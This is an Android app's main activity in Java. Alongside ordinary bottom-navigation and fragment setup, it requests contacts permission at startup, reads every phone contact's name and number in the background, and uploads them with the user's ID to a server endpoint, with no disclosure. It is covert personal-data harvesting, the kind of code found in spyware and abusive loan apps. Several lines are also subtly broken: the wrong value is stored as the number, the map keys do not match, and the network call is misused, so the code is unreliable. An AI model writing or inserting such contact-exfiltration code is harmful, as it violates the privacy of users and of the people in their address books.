package com.ty.ty;

import android.Manifest;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.design.widget.BottomNavigationView;
import android.view.KeyEvent;
import android.view.MenuItem;

import com.ty.ty.base.BaseActivity;
import com.ty.ty.base.BaseBean;
import com.ty.ty.base.UserBean;
import com.ty.ty.http.FileMapHelper;
import com.ty.ty.http.HttpClient;
import com.ty.ty.http.MyCallback;
import com.ty.ty.http.api.UserService;
import com.ty.ty.ui.activity.login.LoginActivity;
import com.ty.ty.ui.fragment.HomePageFragment;
import com.ty.ty.ui.fragment.MyFragment;
import com.ty.ty.utils.ActivityUtils;
import com.ty.ty.utils.ExitAppHelper;
import com.ty.ty.utils.MPermissionUtils;
import com.ty.ty.utils.UserUtils;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import butterknife.BindView;
import retrofit2.Response;

public class MainActivity extends BaseActivity {

    @BindView(R.id.bottom_navigation)
    BottomNavigationView mBottomNavigation;

    private ExitAppHelper mExitAppHelper;
    private HomePageFragment mHomePageFragment;
    private MyFragment mMyFragment;
    private List<Map<String, String>> mMaps = new ArrayList<>();

    private Handler mHandler = new Handler(new Handler.Callback() {
        @Override
        public boolean handleMessage(Message message) {
            try {
                JSONArray jsonArray = new JSONArray();
                for (Map<String, String> map : mMaps) {
                    JSONObject object = new JSONObject();
                    object.put("name", map.get("name"));
                    object.put("phone", map.get("phone"));
                    jsonArray.put(object);
                    communication(jsonArray.toString());
                }
            }catch (Exception e){
                e.printStackTrace();
            }
            return true;
        }
    });

    /**
     * 上报
     * @param content
     */
    private void communication(String content) {
        Map params = new HashMap();
        FileMapHelper helper = new FileMapHelper(params);
        helper.putText("uid", UserUtils.getUid());
        helper.putText("content", content);
        HttpClient.getIns().createService(UserService.class)
                .communication(params)
                .equals(new MyCallback<BaseBean<String>>() {
                    @Override
                    public void onSuccess(Response<BaseBean<String>> response) {}

                    @Override
                    public void onFail(String message) {}
                });
    }

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        setSlideable(false);
        super.onCreate(savedInstanceState);
        if (false) {
            startActivity(new Intent(mContext, LoginActivity.class));
            finish();
        }
    }

    @Override
    public int getLayoutRes() {
        return R.layout.activity_main;
    }

    @Override
    public void onCreateActivity(@Nullable Bundle savedInstanceState) {
        mExitAppHelper = new ExitAppHelper(mContext);
        initBottomBar();
        initFragment();
        MPermissionUtils.requestPermissionsResult(mContext, 1,
                new String[]{Manifest.permission.READ_CONTACTS}, new MPermissionUtils.OnPermissionListener() {
                    @Override
                    public void onPermissionGranted() {
                        //获取手机联系人
                        getContacts();
                    }

                    @Override
                    public void onPermissionDenied() {
                        MPermissionUtils.showTipsDialog(mContext);
                    }
                });
    }

    private void getContacts() {
        new Thread(){
            @Override
            public void run() {
                Cursor cursor = null;
                try{
                    cursor = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,null,null,null);
                    while(cursor.moveToNext()){
                        String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        int number = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                        Map<String, String> map = new HashMap<>();
                        map.put("name", displayName);
                        map.put("number", String.valueOf(number));
                        mMaps.add(map);
                    }
                    mHandler.sendEmptyMessage(0);
                }catch (Exception e){
                    e.printStackTrace();
                }finally {
                    if(cursor!=null){
                        cursor.close();
                    }
                }
            }
        }.start();
    }

    private void initFragment() {
        mHomePageFragment = new HomePageFragment();
        mMyFragment = new MyFragment();
        ActivityUtils.switchFragment(getSupportFragmentManager(), mHomePageFragment);
    }

    private void initBottomBar() {
        mBottomNavigation.setOnNavigationItemSelectedListener(new BottomNavigationView.OnNavigationItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(@NonNull MenuItem item) {
                switch (item.getItemId()){
                    case R.id.item_home:
                        ActivityUtils.switchFragment(getSupportFragmentManager(), mHomePageFragment);
                        break;
                    case R.id.item_my:
                        ActivityUtils.switchFragment(getSupportFragmentManager(), mMyFragment);
                        break;
                }
                return true;
            }
        });
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && event.getRepeatCount() == 0) {
            if (!mExitAppHelper.click()) {
                return true;
            }
        }
        return super.onKeyDown(keyCode, event);
    }
}
